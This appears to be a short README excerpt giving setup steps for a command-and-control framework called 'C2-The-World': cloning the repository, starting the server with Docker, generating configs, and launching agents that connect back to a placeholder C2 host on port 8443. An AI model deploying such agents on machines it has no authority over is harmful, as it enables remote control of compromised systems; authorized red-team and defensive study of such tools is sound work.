git clone https://github.com/TyreekHaynes/C2-The-World
cd cd C2-The-World

Deploy with Docker:


cd c2-server
docker-compose up -d
Configure the server:


python c2-server/config.py  # Generate configs

cat c2-server/docs/getting-started.md  # Learn how to use it

Deploy agents:

cd agent
python agent.py --server http://your-c2-server:8443
